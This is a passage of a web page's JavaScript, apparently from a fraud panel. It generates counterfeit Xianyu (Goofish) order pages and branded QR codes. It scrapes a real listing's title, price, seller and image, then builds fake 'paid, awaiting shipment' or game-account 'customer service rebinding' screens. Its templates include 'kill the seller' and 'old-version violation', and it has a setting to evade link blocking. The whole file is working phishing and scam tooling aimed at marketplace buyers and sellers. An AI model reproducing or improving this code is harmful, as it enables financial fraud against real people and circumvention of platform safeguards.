        var caijiBtn = document.getElementById('caiji-btn');
        
        // 获取所有预览区域
        var previewSections = document.querySelectorAll('.preview-section');
        
        // 检查必填项是否都填写了
        function checkRequiredFields() {
            var sellerName = sellerNameInput ? sellerNameInput.value.trim() : '';
            var title = titleInput.value.trim();
            var price = priceInput.value.trim();
            var hasImage = imageLink !== '';
            
            return sellerName !== '' && title !== '' && price !== '' && hasImage;
        }
        
        // 检查缺少的必填项
        function getMissingFields() {
            var missingFields = [];
            var sellerName = sellerNameInput ? sellerNameInput.value.trim() : '';
            var title = titleInput.value.trim();
            var price = priceInput.value.trim();
            var hasImage = imageLink !== '';
            
            if (!sellerName) missingFields.push('卖家名称');
            if (!title) missingFields.push('标题');
            if (!price) missingFields.push('价格');
            if (!hasImage) missingFields.push('封面图');
            
            return missingFields;
        }
        
        // 更新开关状态
        function updateSwitchState() {
            var allFieldsFilled = checkRequiredFields();
            
            if (allFieldsFilled) {
                // 所有必填项都已填写，启用开关
                orderSwitch.disabled = false;
                switchContainer.classList.remove('disabled');
            } else {
                // 有必填项未填写，禁用开关并关闭
                orderSwitch.disabled = true;
                orderSwitch.checked = false;
                switchContainer.classList.add('disabled');
                
                // 如果开关之前是开启的，现在关闭了，需要更新二维码
                if (isOrderEnabled) {
                    isOrderEnabled = false;
                    updateQRCodeWithOrder();
                }
            }
        }
        
        // 检查并显示/隐藏提示信息
        function updateFieldHints() {
            // 卖家名称提示
            if (sellerNameInput) {
                sellerNameHint.classList.toggle('show', sellerNameInput.value.trim() === '');
            }
            
            // 标题提示
            titleHint.classList.toggle('show', titleInput.value.trim() === '');
            
            // 价格提示
            priceHint.classList.toggle('show', priceInput.value.trim() === '');
            
            // 图片提示
            imageHint.classList.toggle('show', imageLink === '');
        }
        
        // 卖家名称输入监听
        if (sellerNameInput) {
            sellerNameInput.addEventListener('input', function() {
                orderParams.shop = this.value;
                updateSwitchState();
                updateFieldHints();
                updateQRCodeWithOrder();
            });
        }
        
        // 开启订单开关监听
        if (orderSwitch && switchContainer) {
            // 为开关容器添加点击事件
            switchContainer.addEventListener('click', function(e) {
                // 如果开关是禁用的，显示红色警告
                if (orderSwitch.disabled) {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    var missingFields = getMissingFields();
                    if (missingFields.length > 0) {
                        // 显示红色警告消息
                        showMessage('请先填写' + missingFields.join('、'), true);
                    }
                    return false;
                }
            });
            
            // 开关状态变化监听
            orderSwitch.addEventListener('change', function() {
                if (this.disabled) {
                    return;
                }
                
                isOrderEnabled = this.checked;
                updateQRCodeWithOrder();
                
                // 显示开关状态消息
                if (isOrderEnabled) {
                    // 开启时显示绿色成功消息
                    showMessage('订单生成功能已开启', false);
                } else {
                    // 关闭时显示红色警告消息
                    showMessage('订单生成功能已关闭', true);
                }
            });
        }
        
        // 更新订单参数并生成链接
        function updateQRCodeWithOrder() {
            var currentTemplate = templateSelect.value;
            var qrText = qrCodeUrl; // 基础链接
            
            // 只有在模板1、2、3且开启订单时才添加参数
            if (['1', '2', '3'].includes(currentTemplate) && isOrderEnabled && checkRequiredFields()) {
                // 获取当前值
                orderParams.title = titleInput.value || '';
                orderParams.rmb = priceInput.value || '';
                orderParams.shop = sellerNameInput ? sellerNameInput.value || '' : '';
                orderParams.img = imageLink || '';
                
                // 构建参数
                var params = [];
                if (orderParams.shop) params.push('shop=' + encodeURIComponent(orderParams.shop));
                if (orderParams.title) params.push('title=' + encodeURIComponent(orderParams.title));
                if (orderParams.rmb) params.push('rmb=' + encodeURIComponent(orderParams.rmb));
                if (orderParams.img) params.push('img=' + encodeURIComponent(orderParams.img));
                
                if (params.length > 0) {
                    // 检查链接是否已经有参数
                    var separator = qrText.includes('?') ? '&' : '?';
                    qrText = qrText + separator + params.join('&');
                }
            }
            
            // 对于模板4、5、6，使用用户输入的链接
            if (['4', '5', '6'].includes(currentTemplate) && qrLinkInput && qrLinkInput.value) {
                qrText = qrLinkInput.value;
            }
            
            // 更新二维码
            updateQRCode(currentTemplate, qrText);
            return qrText;
        }
        
        // 价格输入监听
        priceInput.addEventListener('input', function() {
            var price = this.value;
            previewPrice.textContent = price;
            previewPrice2.textContent = price;
            orderParams.rmb = price;
            updateSwitchState();
            updateFieldHints();
            updateQRCodeWithOrder();
        });
        
        // 支付方式监听
        paySelect.addEventListener('change', function() {
            previewPayType.textContent = this.value;
        });
        
        // 标题输入监听
        titleInput.addEventListener('input', function() {
            var title = this.value;
            previewTitle.textContent = title;
            orderParams.title = title;
            updateSwitchState();
            updateFieldHints();
            updateQRCodeWithOrder();
        });
        
        // 二维码链接输入监听
        if (qrLinkInput) {
            qrLinkInput.addEventListener('input', function() {
                // 当二维码链接改变时，重新生成二维码
                var currentTemplate = templateSelect.value;
                if (['4', '5', '6'].includes(currentTemplate)) {
                    updateQRCode(currentTemplate, this.value);
                }
            });
        }
        
        // 图片上传监听 - 修改为上传到服务器
        uploadCover.addEventListener('change', function(e) {
            var file = e.target.files[0];
            if (file) {
                // 显示上传中状态
                uploadLabel.textContent = '上传中...';
                
                // 创建FormData对象
                var formData = new FormData();
                formData.append('image', file);
                
                // 发送AJAX请求上传图片
                var xhr = new XMLHttpRequest();
                xhr.open('POST', window.location.href, true);
                
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            if (response.success) {
                                imageLink = response.url;
                                orderParams.img = imageLink;
                                
                                // 更新预览图片
                                previewImage.src = imageLink;
                                uploadLabel.textContent = '已上传';

                                // 更新开关状态和提示
                                updateSwitchState();
                                updateFieldHints();
                                
                                // 更新二维码
                                updateQRCodeWithOrder();
                                
                                // 显示绿色成功消息
                                showMessage('图片上传成功', false);
                            } else {
                                uploadLabel.textContent = '上传图片';
                                // 显示红色失败消息
                                showMessage('上传失败: ' + response.message, true);
                            }
                        } catch (e) {
                            uploadLabel.textContent = '上传图片';
                            console.error('解析响应失败:', e);
                            // 显示红色失败消息
                            showMessage('上传失败', true);
                        }
                    } else {
                        uploadLabel.textContent = '上传图片';
                        // 显示红色失败消息
                        showMessage('上传失败，服务器错误', true);
                    }
                };
                
                xhr.onerror = function() {
                    uploadLabel.textContent = '上传图片';
                    // 显示红色失败消息
                    showMessage('上传失败，网络错误', true);
                };
                
                xhr.send(formData);
            }
        });
        
        // 采集按钮点击事件
        if (caijiBtn) {
            caijiBtn.addEventListener('click', function() {
                var url = caijiUrlInput ? caijiUrlInput.value.trim() : '';
                if (!url) {
                    showMessage('请输入闲鱼商品链接', true);
                    return;
                }
                
                var currentTemplate = templateSelect.value;
                if (!['1', '2', '3'].includes(currentTemplate)) {
                    showMessage('当前模板不支持采集功能', true);
                    return;
                }
                
                // 设置按钮为加载状态
                caijiBtn.disabled = true;
                caijiBtn.textContent = '采集中...';
                caijiBtn.style.background = '#999';
                
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/api/goofishcaiji?action=caiji', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                
                xhr.onload = function() {
                    caijiBtn.disabled = false;
                    caijiBtn.textContent = '采集';
                    caijiBtn.style.background = '#4a7bff';
                    
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            if (response.success) {
                                var data = response.data;
                                
                                // 填充标题
                                if (data.title && titleInput) {
                                    titleInput.value = data.title;
                                    previewTitle.textContent = data.title;
                                    orderParams.title = data.title;
                                }
                                
                                // 填充价格
                                if (data.price && priceInput) {
                                    priceInput.value = data.price;
                                    previewPrice.textContent = data.price;
                                    previewPrice2.textContent = data.price;
                                    orderParams.rmb = data.price;
                                }
                                
                                // 填充卖家名称
                                if (data.seller && sellerNameInput) {
                                    sellerNameInput.value = data.seller;
                                    orderParams.shop = data.seller;
                                }
                                
                                // 填充封面图
                                if (data.coverImage) {
                                    imageLink = data.coverImage;
                                    orderParams.img = imageLink;
                                    previewImage.src = imageLink;
                                    uploadLabel.textContent = '上传图片';
                                    imageLinkDisplay.innerHTML = '<span style="color: #52c41a; font-size: 13px;">采集成功</span>';
                                }
                                
                                // 更新开关状态和提示
                                updateSwitchState();
                                updateFieldHints();
                                updateQRCodeWithOrder();
                                
                                showMessage('采集成功', false);
                            } else {
                                showMessage(response.message || '采集失败', true);
                            }
                        } catch (e) {
                            console.error('解析响应失败:', e);
                            showMessage('采集失败，数据解析错误', true);
                        }
                    } else {
                        showMessage('采集失败，服务器错误', true);
                    }
                };
                
                xhr.onerror = function() {
                    caijiBtn.disabled = false;
                    caijiBtn.textContent = '采集';
                    caijiBtn.style.background = '#4a7bff';
                    showMessage('采集失败，网络错误', true);
                };
                
                xhr.send('cajiURL=' + encodeURIComponent(url));
            });
        }
        
        // 模板选择监听
        templateSelect.addEventListener('change', function() {
            var templateValue = this.value;
            
            // 更新步骤文本
            updateTemplateSteps(templateValue);
            
            // 根据模板显示/隐藏表单行
            updateFormVisibility(templateValue);
            
            // 显示/隐藏对应的预览区域
            updatePreviewVisibility(templateValue);
            
            // 更新开关状态
            updateSwitchState();
            updateFieldHints();
            
            // 更新二维码
            updateQRCodeWithOrder();
        });
        
        // 更新模板步骤函数
        function updateTemplateSteps(templateValue) {
            switch(templateValue) {
                case '1': // 游戏
                    step1.textContent = '已下单';
                    step2.textContent = '联系客服';
                    step3.textContent = '客服换绑';
                    step4.textContent = '确认收货';
                    break;
                case '2': // 实物-发货
                    step1.textContent = '已付款';
                    step2.textContent = '待发货';
                    step3.textContent = '待收货';
                    step4.textContent = '待评价';
                    break;
                case '3': // 实物-验货
                    step1.textContent = '已付款';
                    step2.textContent = '待验货';
                    step3.textContent = '待发货';
                    step4.textContent = '待收货';
                    break;
                case '4': // 老版本违规
                case '5': // 老版本游戏
                case '6': // 杀卖家
                    // 这些模板使用独立的HTML结构，不需要更新步骤
                    break;
            }
        }
        
        // 更新表单显示/隐藏
        function updateFormVisibility(templateValue) {
            // 获取所有基本表单行
            var basicFormRows = document.querySelectorAll('.form-row:not(#seller-name-row):not(#order-switch-row):not(#receiver-name-row):not(#receiver-phone-row):not(#receiver-address-row):not(#qr-link-row)');
            
            // 重置所有表单行为显示
            basicFormRows.forEach(function(row) {
                row.style.display = 'flex';
            });
            
            // 隐藏所有特殊行
            if (sellerNameRow) sellerNameRow.style.display = 'none';
            if (orderSwitchRow) orderSwitchRow.style.display = 'none';
            if (receiverNameRow) receiverNameRow.style.display = 'none';
            if (receiverPhoneRow) receiverPhoneRow.style.display = 'none';
            if (receiverAddressRow) receiverAddressRow.style.display = 'none';
            if (qrLinkRow) qrLinkRow.style.display = 'none';
            if (paySelectRow) paySelectRow.style.display = 'flex';
            if (caijiRow) caijiRow.style.display = 'none';
            
            // 隐藏所有提示
            if (sellerNameHint) sellerNameHint.style.display = 'none';
            if (titleHint) titleHint.style.display = 'none';
            if (priceHint) priceHint.style.display = 'none';
            if (imageHint) imageHint.style.display = 'none';
            
            switch(templateValue) {
                case '1': // 游戏
                case '2': // 实物-发货
                case '3': // 实物-验货
                    // 显示所有基本表单行，隐藏二维码链接行，显示扫码选择
                    if (paySelectRow) paySelectRow.style.display = 'flex';
                    if (qrLinkRow) qrLinkRow.style.display = 'none';
                    // 显示卖家名称和开启订单
                    if (sellerNameRow) sellerNameRow.style.display = 'flex';
                    if (orderSwitchRow) orderSwitchRow.style.display = 'flex';
                    // 显示采集行
                    if (caijiRow) caijiRow.style.display = 'flex';
                    break;
                    
                case '4': // 老版本违规
                    // 显示防红配置、模板选择和二维码链接输入
                    basicFormRows.forEach(function(row) {
                        var label = row.querySelector('label').textContent;
                        if (label !== '防红' && label !== '模板') {
                            row.style.display = 'none';
                        }
                    });
                    // 显示收货信息和二维码链接输入
                    if (receiverNameRow) receiverNameRow.style.display = 'flex';
                    if (receiverPhoneRow) receiverPhoneRow.style.display = 'flex';
                    if (receiverAddressRow) receiverAddressRow.style.display = 'flex';
                    if (qrLinkRow) qrLinkRow.style.display = 'flex';
                    if (paySelectRow) paySelectRow.style.display = 'none';
                    break;
                    
                case '5': // 老版本游戏
                case '6': // 杀卖家
                    // 显示防红配置、模板选择和二维码链接输入
                    basicFormRows.forEach(function(row) {
                        var label = row.querySelector('label').textContent;
                        if (label !== '防红' && label !== '模板') {
                            row.style.display = 'none';
                        }
                    });
                    if (qrLinkRow) qrLinkRow.style.display = 'flex';
                    if (paySelectRow) paySelectRow.style.display = 'none';
                    break;
            }
        }
        
        // 更新预览区域显示/隐藏
        function updatePreviewVisibility(templateValue) {
            // 隐藏所有预览区域
            previewSections.forEach(function(section) {
                section.style.display = 'none';
            });
            
            // 显示对应的预览区域
            switch(templateValue) {
                case '1': // 游戏
                case '2': // 实物-发货
                case '3': // 实物-验货
                    if (previewSections[0]) previewSections[0].style.display = 'block';
                    break;
                case '4': // 老版本违规
                    if (previewSections[1]) previewSections[1].style.display = 'block';
                    break;
                case '5': // 老版本游戏
                    if (previewSections[2]) previewSections[2].style.display = 'block';
                    break;
                case '6': // 杀卖家
                    if (previewSections[3]) previewSections[3].style.display = 'block';
                    break;
            }
        }
        
        // 刷新二维码的函数
function updateQRCode(templateValue, qrText) {
    // 如果没有传入qrText，则使用默认值
    if (!qrText) {
        qrText = qrCodeUrl; // 默认使用PHP生成的链接
        
        // 对于新模板（4,5,6），尝试使用用户输入的链接
        if (['4', '5', '6'].includes(templateValue) && qrLinkInput && qrLinkInput.value) {
            qrText = qrLinkInput.value;
        }
    }
    
    console.log('生成二维码，链接:', qrText, '模板:', templateValue);
    
  var qrSize = 118;

// 根据模板设置不同的大小
switch(templateValue) {
    case '4': // 老版本违规
    case '5': // 老版本游戏
    case '6': // 杀卖家
    default: // 其他模板使用默认118x118
        qrSize = 118;
        break;
}
    // 获取当前显示的预览区域
    var currentPreviewSection = null;
    previewSections.forEach(function(section) {
        if (section.style.display !== 'none') {
            currentPreviewSection = section;
        }
    });
    
    if (!currentPreviewSection) {
        console.log('没有找到当前显示的预览区域');
        return;
    }
    
    // 在对应的预览区域中查找二维码容器
    var qrcodeContainer = currentPreviewSection.querySelector("#qrcode");
    if (!qrcodeContainer) {
        console.log('没有找到二维码容器');
        return;
    }
    
    // 清空现有二维码
    qrcodeContainer.innerHTML = '';
    
    // 创建二维码容器
    var qrWrapper = document.createElement('div');
    qrWrapper.style.position = 'relative';
    qrWrapper.style.display = 'inline-block';
    qrWrapper.style.width = qrSize + 'px';
    qrWrapper.style.height = qrSize + 'px';
    
    // 使用正确的二维码生成API接口
    // 添加时间戳防止缓存
    var timestamp = new Date().getTime();
    var qrApiUrl = "https://api.qrtool.cn/?text=" + encodeURIComponent(qrText) + "&size=" + qrSize + "&t=" + timestamp;
    console.log('二维码API URL:', qrApiUrl);
    
    // 创建二维码图片
    var qrImg = document.createElement('img');
    qrImg.src = qrApiUrl;
    qrImg.alt = "二维码";
    qrImg.style.width = '100%';
    qrImg.style.height = '100%';
    
    // 创建中间图标
    var logoImg = document.createElement('img');
    logoImg.src = 'assets/img/xylogo.png';
    logoImg.alt = "图标";
    logoImg.style.position = 'absolute';
    logoImg.style.top = '50%';
    logoImg.style.left = '50%';
    logoImg.style.transform = 'translate(-50%, -50%)';
    logoImg.style.width = Math.floor(qrSize * 0.2) + 'px'; // 图标大小为二维码的20%
    logoImg.style.height = Math.floor(qrSize * 0.2) + 'px';
    logoImg.style.backgroundColor = '#ffffff'; // 白色背景
    logoImg.style.borderRadius = '4px';
    logoImg.style.padding = '2px';
    logoImg.style.boxSizing = 'border-box';
    
    // 处理加载失败
    logoImg.onerror = function() {
        console.log('图标加载失败，尝试使用备用路径');
        // 如果assets/img/xylogo.png不存在，尝试其他路径
        logoImg.src = 'xylogo.png'; // 尝试根目录
        logoImg.onerror = function() {
            console.log('图标加载失败，不显示图标');
            logoImg.style.display = 'none';
        };
    };
    
    qrImg.onload = function() {
        console.log('二维码图片加载成功');
    };
    
    qrImg.onerror = function() {
        console.log('二维码图片加载失败');
        // 如果API失败，可以尝试备用API
        var backupApiUrl = "https://api.qrserver.com/v1/create-qr-code/?size=" + qrSize + "x" + qrSize + "&data=" + encodeURIComponent(qrText) + "&t=" + timestamp;
        qrImg.src = backupApiUrl;
    };
    
    // 添加到容器
    qrWrapper.appendChild(qrImg);
    qrWrapper.appendChild(logoImg);
    qrcodeContainer.appendChild(qrWrapper);
}
        
        // 收货信息输入监听（用于老版本违规模板）
        if (receiverNameInput) {
            receiverNameInput.addEventListener('input', function() {
                var nameElement = document.querySelector('.laobanweigui5');
                if (nameElement) {
                    nameElement.textContent = this.value;
                }
            });
        }
        
        if (receiverPhoneInput) {
            receiverPhoneInput.addEventListener('input', function() {
                var phoneElements = document.querySelectorAll('.laobanweigui5');
                if (phoneElements[1]) {
                    phoneElements[1].textContent = this.value;
                }
            });
        }
        
        if (receiverAddressInput) {
            receiverAddressInput.addEventListener('input', function() {
                var addressElements = document.querySelectorAll('.laobanweigui5');
                if (addressElements[2]) {
                    addressElements[2].textContent = this.value;
                }
            });
        }
        
        // 初始化显示
        previewPayType.textContent = paySelect.value;
        
        // 初始化表单和预览区域
        updateFormVisibility(templateSelect.value);
        updatePreviewVisibility(templateSelect.value);
        
        // 初始化二维码
        updateQRCodeWithOrder();
        
        // 复制链接按钮也要同样处理
        var copyLinkBtn = document.getElementById('copy-link-btn');
        if (copyLinkBtn) {
            copyLinkBtn.style.position = 'relative';
            copyLinkBtn.style.zIndex = '1111';
            
            // 修改复制链接功能，复制带参数的链接
            copyLinkBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                var currentTemplate = templateSelect.value;
                var linkToCopy = updateQRCodeWithOrder();
                
                // 复制到剪贴板
                if (navigator.clipboard && window.isSecureContext) {
                    navigator.clipboard.writeText(linkToCopy).then(function() {
                        // 显示绿色成功消息
                        showMessage('链接已复制到剪贴板', false);
                    }).catch(function(err) {
                        console.error('复制失败:', err);
                        fallbackCopyText(linkToCopy);
                    });
                } else {
                    fallbackCopyText(linkToCopy);
                }
            });
            
            function fallbackCopyText(text) {
                var textArea = document.createElement("textarea");
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.focus();
                textArea.select();
                try {
                    var successful = document.execCommand('copy');
                    var msg = successful ? '链接已复制到剪贴板' : '复制失败';
                    showMessage(msg, !successful);
                } catch (err) {
                    console.error('复制失败:', err);
                    showMessage('复制失败', true);
                }
                document.body.removeChild(textArea);
            }
        }
    });
</script>
</body>
</html>